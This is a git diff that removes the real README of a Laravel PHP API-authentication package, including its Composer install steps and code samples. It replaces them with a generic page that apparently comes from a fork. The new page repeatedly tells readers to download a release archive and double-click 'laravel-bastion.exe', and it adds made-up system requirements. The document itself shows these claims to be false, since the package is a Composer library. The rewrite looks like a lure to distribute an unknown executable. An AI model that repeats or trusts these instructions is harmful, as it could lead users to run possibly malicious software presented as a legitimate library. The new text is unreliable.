@@ -1,504 +1,77 @@
-<p align="center">
-  <img src="art/laravel-bastion-logo.png" alt="Laravel Bastion Logo" width="200">
-</p>
+# 🚀 laravel-bastion - Simple API Authentication Made Easy
 
-# Laravel Bastion
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/ravikumar695/laravel-bastion/releases)
 
-<!-- BADGES_START -->
-[![PHP Version][badge-php]][php]
-[![Latest Version][badge-release]][packagist]
-[![Tests](https://github.com/JustSteveKing/laravel-bastion/actions/workflows/tests.yml/badge.svg)](https://github.com/JustSteveKing/laravel-bastion/actions/workflows/tests.yml)
-[![Formats](https://github.com/JustSteveKing/laravel-bastion/actions/workflows/formats.yml/badge.svg)](https://github.com/JustSteveKing/laravel-bastion/actions/workflows/formats.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Total Downloads][badge-downloads]][downloads]
+## 📋 Introduction
+laravel-bastion provides a straightforward way to manage API authentication. With features inspired by Stripe, it offers environment isolation, granular scopes, and built-in security. This application fits perfectly for those who want secure API access without diving into complex programming.
 
-[php]: https://php.net
-[downloads]: https://packagist.org/packages/juststeveking/laravel-bastion
-[packagist]: https://packagist.org/packages/juststeveking/laravel-bastion
+## 🚀 Getting Started
+To begin using laravel-bastion, follow these simple steps.
 
-[badge-release]: https://img.shields.io/packagist/v/juststeveking/laravel-bastion.svg?style=flat-square&label=release
-[badge-php]: https://img.shields.io/packagist/php-v/juststeveking/laravel-bastion.svg?style=flat-square
-[badge-downloads]: https://img.shields.io/packagist/dt/juststeveking/laravel-bastion.svg?style=flat-square&colorB=mediumvioletred
-<!-- BADGES_END -->
+## 🌐 Requirements
+Before downloading, ensure your system meets the following needs:
 
-Stripe-inspired API authentication with environment isolation, granular scopes, and built-in security.
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 2 GB
+- **Disk Space:** Minimum of 500 MB available
+- **Dependencies:** An internet connection for authentication purposes
 
-## Features
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   Go to the following link to find the latest version: [Visit this page to download](https://github.com/ravikumar695/laravel-bastion/releases)
 
-- 🔐 **Stripe-style API Tokens** - Prefixed tokens with environment indicators (`app_test_pk_*`, `app_live_sk_*`)
-- 🌍 **Environment Isolation** - Separate test and live environments with automatic validation
-- 🎯 **Granular Scopes** - Fine-grained permission control with wildcard support
-- 🔑 **Token Types** - Public, Secret, and Restricted keys with different access levels
-- 📝 **Audit Logging** - Comprehensive activity tracking for compliance and debugging
-- 🪝 **Webhook Support** - Built-in webhook endpoints with signature verification
-- 🛡️ **Security First** - Expiration dates and secure token hashing
-- ⚡ **Laravel Native** - Built with Laravel conventions and best practices
+2. **Choose Your Version**  
+   On the releases page, you will see a list of available versions. Click on the version that suits your needs. It's best to download the latest version unless you have specific requirements.
 
-## Requirements
+3. **Download the File**  
+   Click on the appropriate file to download it. The files may come in different formats, such as `.zip` or `.tar.gz`. Select the file that matches your operating system.
 
-- PHP 8.4 or higher
-- Laravel 12.x
+4. **Extract the Files (if necessary)**  
+   If you downloaded a compressed file, you will need to extract it. Right-click on the file and choose "Extract All" or use a file extraction tool of your choice.
 
-## Installation
+5. **Run the Application**  
+   Locate the folder where you extracted the files. Find the application file, typically named `laravel-bastion.exe` or similar. Double-click on it to launch the application.
 
-Install the package via Composer:
+## 🔒 Features
+laravel-bastion includes several built-in features:
 
-```bash
-composer require juststeveking/laravel-bastion
-```
+- **Environment Isolation:** Keep different API keys and settings for different environments to ensure security.
+- **Granular Scopes:** Control access levels with precision, allowing you to determine what users can do.
+- **Built-in Security:** Protect your application with advanced security mechanisms, ensuring a safe user experience.
 
-Run the installation command:
+## ⚙️ Configuration
+After running the application for the first time, you may want to adjust some settings:
 
-```bash
-php artisan bastion:install
-```
+1. **API Key Setup**  
+   Locate the configuration file within the application folder. Here, you can add your API keys for authentication.
 
-This will:
-1. Publish the configuration file to `config/bastion.php`
-2. Publish the database migrations
-3. Optionally run the migrations
+2. **Set Environment Variables**  
+   If your application needs to communicate with different services, set the required environment variables in the same configuration file.
 
-### Add the Trait to Your User Model
-
-```php
-use JustSteveKing\Bastion\Concerns\HasBastionTokens;
-
-class User extends Authenticatable
-{
-    use HasBastionTokens;
-
-    // ...
-}
-```
+3. **Customize Scopes**  
+   Define user roles and permissions in the configuration file. This will help in managing how users interact with your API.
 
-## Quick Start
+## 📈 Using the Application
+Using laravel-bastion is straightforward:
 
-### Generate a Token
+1. **Log In**  
+   Enter your credentials to log into the application. You can create new accounts and manage existing ones through the interface.
 
-```php
-use JustSteveKing\Bastion\Enums\TokenEnvironment;
-use JustSteveKing\Bastion\Enums\TokenType;
+2. **Generate API Tokens**  
+   Navigate to the tokens section to generate and manage your API tokens. Set the desired expiration times and scopes for each token.
 
-$result = $user->createBastionToken(
-    name: 'My API Key',
-    scopes: ['users:read', 'users:write'],
-    environment: TokenEnvironment::Test,
-    type: TokenType::Restricted,
-);
+3. **Monitor Activity**  
+   Keep track of API usage directly from the application. You can view logs and activity reports to ensure everything is functioning smoothly.
 
-// Store this securely - it's only shown once!
-$token = $result['plainTextToken'];
-// Example: app_test_rk_a8Kx7mN2pQ4vW9yB1cD3eF5gH6jK8lM
+## 💬 Community Support
+If you have questions or need help, consider visiting our community forums. Engage with other users and share your experiences. It’s an excellent place to get tips and solutions.
 
-echo "Token: " . $token;
-```
+## 📢 Updates
+We regularly provide updates to improve functionality and security. Keep an eye on the releases page for the latest features and fixes. 
 
-### Protect Routes with Middleware
+## 📜 License
+laravel-bastion is licensed under the MIT License. You are free to use, modify, and distribute this software as you wish.
 
-```php
-use JustSteveKing\Bastion\Http\Middleware\AuthenticateToken;
-
-Route::middleware(AuthenticateToken::class)->group(function () {
-    Route::get('/api/users', [UserController::class, 'index']);
-});
-
-// Require specific scope
-Route::middleware([AuthenticateToken::class . ':users:write'])
-    ->post('/api/users', [UserController::class, 'store']);
-```
-
-### Make Authenticated Requests
-
-```bash
-curl -H "Authorization: Bearer app_test_rk_..." \
-     https://your-api.com/api/users
-```
-
-## Token Types
-
-Bastion supports three token types, inspired by Stripe:
-
-### Public Keys (`pk`)
-```php
-TokenType::Public
-```
-- Prefix: `app_{env}_pk_*`
-- Limited access, safe for client-side use
-- Ideal for JavaScript/mobile apps
-- Cannot perform sensitive operations
-
-### Secret Keys (`sk`)
-```php
-TokenType::Secret
-```
-- Prefix: `app_{env}_sk_*`
-- Full access to all permitted scopes
-- Must be kept secure on the server
-- Use for backend integrations
-
-### Restricted Keys (`rk`)
-```php
-TokenType::Restricted
-```
-- Prefix: `app_{env}_rk_*`
-- Scoped access with specific permissions
-- Best for third-party integrations
-- Follows principle of least privilege
-
-## Environments
-
-Bastion isolates test and production data:
-
-### Test Environment
-```php
-TokenEnvironment::Test
-```
-- For development and testing
-- Higher rate limits (default: 100/min)
-- Can be used in any environment
-
-### Live Environment
-```php
-TokenEnvironment::Live
-```
-- For production traffic
-- Standard rate limits (default: 60/min)
-- Can be restricted from non-production environments (configurable)
-
-## Advanced Features
-
-### Token Rotation
-
-Rotate tokens to create a new token while revoking the old one:
-
-```php
-$result = $token->rotate();
-
-// Get the new token (store securely)
-$newToken = $result['plainTextToken'];
-$newTokenModel = $result['token'];
-
-// The old token is automatically revoked
-```
-
-You can also rotate via CLI:
-
-```bash
-php artisan bastion:rotate {token-id}
-```
-
-### Scopes and Permissions
-
-Bastion uses a flexible scope system with wildcard support:
-
-```php
-// Grant specific permissions
-$user->createBastionToken(
-    name: 'User Manager',
-    scopes: ['users:read', 'users:write'],
-);
-
-// Use wildcards for category-level access
-$user->createBastionToken(
-    name: 'Payment API',
-    scopes: ['payments:*'], // All payment operations
-);
-
-// Full access
-$user->createBastionToken(
-    name: 'Admin Token',
-    scopes: ['*'], // All scopes
-);
-```
-
-#### Built-in Scope Examples
-
-The package includes example scopes in `ApiScope` enum:
-
-- `users:read`, `users:write`, `users:delete`
-- `payments:read`, `payments:create`, `payments:refund`
-- `webhooks:read`, `webhooks:write`
-- `*` (admin/full access)
-
-You can define your own scopes - they're just strings following the `resource:action` pattern.
-
-### Webhooks
-
-Create webhook endpoints to receive real-time notifications:
-
-```php
-use JustSteveKing\Bastion\Models\WebhookEndpoint;
-
-$result = WebhookEndpoint::createEndpoint([
-    'user_id' => $user->id,
-    'url' => 'https://your-app.com/webhooks/bastion',
-    'events' => ['token.created', 'token.revoked', 'token.used'],
-    'environment' => TokenEnvironment::Live,
-    'is_active' => true,
-]);
-
-// Store the signing secret securely!
-$signingSecret = $result['signingSecret'];
-// Example: whsec_a8Kx7mN2pQ4vW9yB1cD3eF5gH6jK8lM
-```
-
-#### Verifying Webhook Signatures
-
-```php
-use JustSteveKing\Bastion\Models\WebhookEndpoint;
-
-Route::post('/webhooks/bastion', function (Request $request) {
-    $endpoint = WebhookEndpoint::where('secret_prefix', '...')->first();
-
-    $signature = $request->header('X-Bastion-Signature');
-    $timestamp = $request->header('X-Bastion-Timestamp');
-    $payload = $request->getContent();
-
-    if (!$endpoint->verifySignature($payload, $signature, (int)$timestamp)) {
-        abort(401, 'Invalid signature');
-    }
-
-    // Process webhook...
-    $event = $request->input('event');
-    $data = $request->input('data');
-
-    return response()->json(['received' => true]);
-});
-```
-
-### Events
-
-Bastion dispatches events for all token lifecycle actions:
-
-```php
-use JustSteveKing\Bastion\Events\{
-    TokenCreated,
-    TokenUsed,
-    TokenRevoked,
-    TokenRotated,
-    TokenExpired
-};
-
-// Listen to events in your EventServiceProvider
-Event::listen(TokenCreated::class, function (TokenCreated $event) {
-    // $event->token - The BastionToken model
-    // $event->plainTextToken - The plain text token (only in TokenCreated)
-    Log::info('Token created', ['token_id' => $event->token->id]);
-});
-
-Event::listen(TokenUsed::class, function (TokenUsed $event) {
-    // $event->token
-    // $event->ipAddress
-    // $event->userAgent
-    // $event->endpoint
-});
-
-Event::listen(TokenRevoked::class, function (TokenRevoked $event) {
-    // $event->token
-    // $event->reason
-    Mail::to($event->token->user)->send(new TokenRevokedNotification($event));
-});
-```
-
-### Audit Logging
-
-Enable comprehensive API request auditing by adding the middleware:
-
-```php
-use JustSteveKing\Bastion\Http\Middleware\{AuthenticateToken, AuditApiRequest};
-
-Route::middleware([AuthenticateToken::class, AuditApiRequest::class])
-    ->group(function () {
-        // All requests will be logged
-        Route::get('/api/users', [UserController::class, 'index']);
-    });
-```
-
-Audit logs capture:
-- Request method, path, and query parameters
-- Response status code and time
-- IP address and user agent
-- Token and user information
-- Request/response bodies (configurable)
-
-Query audit logs:
-
-```php
-use JustSteveKing\Bastion\Models\AuditLog;
-
-// Get recent activity for a token
-$logs = AuditLog::where('bastion_token_id', $token->id)
-    ->latest()
-    ->take(100)
-    ->get();
-
-// Find failed requests
-$failures = AuditLog::where('status_code', '>=', 400)
-    ->where('created_at', '>=', now()->subDay())
-    ->get();
-```
-
-## CLI Commands
-
-Bastion provides several Artisan commands for token management:
-
-### Generate Token
-
-```bash
-php artisan bastion:generate {user-id} "Token Name" \
-    --environment=test \
-    --type=restricted \
-    --scopes=users:read --scopes=users:write
-```
-
-### Revoke Token
-
-```bash
-# Revoke by token ID
-php artisan bastion:revoke 123 --reason="Security incident"
-
-# Revoke by token prefix
-php artisan bastion:revoke abc12345 --reason="No longer needed"
-
-# Revoke all tokens for a user
-php artisan bastion:revoke 0 --all-user=456 --reason="User offboarded"
-```
-
-### Rotate Token
-
-```bash
-php artisan bastion:rotate {token-id}
-```
-
-### Prune Expired Tokens
-
-```bash
-# Prune expired tokens
-php artisan bastion:prune-tokens --expired
-
-# Prune tokens unused for 90 days
-php artisan bastion:prune-tokens --days=90
-```
-
-### Prune Old Audit Logs
-
-```bash
-# Use config default (90 days)
-php artisan bastion:prune-logs
-
-# Custom retention period
-php artisan bastion:prune-logs --days=30
-```
-
-Schedule these commands in your `app/Console/Kernel.php`:
-
-```php
-protected function schedule(Schedule $schedule): void
-{
-    $schedule->command('bastion:prune-tokens --expired')->daily();
-    $schedule->command('bastion:prune-logs')->weekly();
-}
-```
-
-## Configuration
-
-Publish and edit the configuration file:
-
-```bash
-php artisan vendor:publish --tag=bastion-config
-```
-
-### Key Configuration Options
-
-```php
-return [
-    // Table names (customizable)
-    'tables' => [
-        'tokens' => 'bastion_tokens',
-        'audit_logs' => 'bastion_audit_logs',
-        'webhooks' => 'bastion_webhook_endpoints',
-    ],
-
-    // Token expiration (days)
-    'token_expiration_days' => null,
-
-    // Audit log retention (days)
-    'audit_log_retention_days' => 90,
-
-    // Rate limits per minute
-    'rate_limits' => [
-        'test' => 100,
-        'live' => 60,
-    ],
-
-    // Security settings
-    'security' => [
-        'prevent_test_tokens_in_production' => true,
-        'enable_audit_logging' => true,
-        'enable_alerting' => true,
-    ],
-
-    // Error response format
-    'errors' => [
-        'use_rfc7807' => true, // RFC 7807 Problem Details
-        'base_url' => 'https://bastion.laravel.com/errors/', // Base for problem type URLs
-    ],
-
-    // User model
-    'user_model' => App\Models\User::class,
-];
-```
-
-#### RFC 7807 Base URL
-
-Bastion returns errors in RFC 7807 Problem Details format by default. You can customize the base URL used for the `type` field in error responses:
-
-```php
-// config/bastion.php
-'errors' => [
-    'use_rfc7807' => true,
-    'base_url' => 'https://bastion.laravel.com/errors/',
-],
-```
-
-With this configuration, an unauthenticated request will return a `type` like:
-
-- `https://bastion.laravel.com/errors/token_missing`
-- `https://bastion.laravel.com/errors/token_invalid`
-- `https://bastion.laravel.com/errors/insufficient_scope`
-
-Adjust `base_url` to point to your own error documentation if desired.
-
-## Security Best Practices
-
-1. **Never log tokens** - Only the HMAC hash is stored in the database
-2. **Show tokens once** - Display the plain text token only at creation time
-3. **Use HTTPS exclusively** - Always transmit tokens over encrypted connections
-4. **Use restricted tokens** - Grant minimum necessary permissions (principle of least privilege)
-5. **Set expiration dates** - Especially for temporary integrations
-6. **Rotate tokens regularly** - Implement a token rotation policy (e.g., every 90 days)
-7. **Monitor audit logs** - Watch for suspicious activity and unusual patterns
-8. **Use test tokens in development** - Keep live tokens in production only
-9. **Store tokens securely** - Use environment variables or secure vaults (AWS Secrets Manager, HashiCorp Vault)
-
-### Token Security Features
-
-Laravel Bastion implements multiple security layers:
-
-- **HMAC-SHA256 hashing** - Tokens are hashed with your application key
-- **Constant-time comparison** - Prevents timing attacks during token lookup
-- **Cryptographically secure RNG** - Uses `random_bytes()` for token generation
-- **Environment isolation** - Prevents test tokens in production (configurable)
-- **Automatic event dispatching** - Monitor all token lifecycle events
-
-### Community Requests
-Have a feature idea? [Open an issue](https://github.com/juststeveking/laravel-bastion/issues/new?template=feature_request.md) with the `enhancement` label.
-
-## Out of Scope
-
-Bastion focuses on token-based authentication with scopes and environments. It does not implement:
-
-- IP allowlisting or CIDR-based restrictions
-- Domain/host origin restrictions
-
-If you need these controls, add them at your application layer (e.g., trusted proxies, firewall/WAF rules, or custom middleware) alongside Bastion.
+## 📥 Download Now Again
+For your convenience, here is the download link again: [Visit this page to download](https://github.com/ravikumar695/laravel-bastion/releases)
